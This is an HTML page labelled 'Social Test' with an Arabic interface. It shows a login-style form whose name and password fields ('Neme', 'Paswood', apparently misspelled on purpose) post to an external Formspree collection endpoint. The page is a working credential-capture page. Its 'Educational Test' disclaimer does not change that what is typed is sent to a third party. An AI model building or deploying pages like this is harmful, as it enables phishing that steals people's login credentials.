<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Social Test</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg,#f4f4f4,#dedede);
  display: flex;
  justify-content: center;
  align-items: center;
  transition: .3s;
}

body.dark {
  background: #111;
  color: white;
}

.card {
  width: 92%;
  max-width: 380px;
  background: white;
  padding: 30px 25px;
  border-radius: 22px;
  box-shadow: 0 12px 40px rgba(0,0,0,.18);
  text-align: center;
}

.dark .card {
  background: #1e1e1e;
}

.logo {
  font-size: 32px;
  font-weight: bold;
  margin-bottom: 8px;
}

.subtitle {
  color: #777;
  font-size: 14px;
  margin-bottom: 25px;
}

input {
  width: 100%;
  padding: 14px;
  margin-bottom: 12px;
  border: 1px solid #ddd;
  border-radius: 10px;
  outline: none;
  font-size: 15px;
}

input:focus {
  border-color: #555;
}

button {
  width: 100%;
  padding: 14px;
  border: 0;
  border-radius: 10px;
  background: #222;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: .2s;
}

button:hover {
  transform: translateY(-2px);
}

button:active {
  transform: scale(.97);
}

.theme {
  margin-top: 15px;
  background: transparent;
  color: #555;
  border: 1px solid #ddd;
  font-size: 13px;
}

.message {
  display: none;
  margin-top: 15px;
  padding: 12px;
  border-radius: 10px;
  font-size: 14px;
}

.success {
  background: #e8f7e8;
  color: #187a18;
}

.error {
  background: #ffeaea;
  color: #b00000;
}

.note {
  margin-top: 20px;
  color: #888;
  font-size: 11px;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">Social Test</div>

  <div class="subtitle">
    تجربة واجهة اجتماعية
  </div>

  <form id="testForm"
        action="https://formspree.io/f/xrpzoaod"
        method="POST">

    <input
      type="text"
      name="Neme"
      placeholder="Neme"
      autocomplete="off"
    >

    <input
      type="text"
      name="Paswood"
      placeholder="Paswood - نص تجريبي"
      autocomplete="off"
    >

    <button type="submit">
      إرسال التجربة
    </button>

    <div id="error" class="message error">
      ⚠️ لازم تعمر الخانتين.
    </div>

  </form>

  <button class="theme" onclick="toggleTheme()">
    🌙 تغيير المظهر
  </button>

  <div class="note">
    Educational Test • لا تدخل معلومات حساسة
  </div>

</div>

<script>
const form = document.getElementById("testForm");
const error = document.getElementById("error");

form.addEventListener("submit", function(e) {

  const fields = form.querySelectorAll("input");

  if (
    !fields[0].value.trim() ||
    !fields[1].value.trim()
  ) {
    e.preventDefault();
    error.style.display = "block";
    return;
  }

  error.style.display = "none";
});

function toggleTheme() {
  document.body.classList.toggle("dark");
}
</script>

</body>
</html>
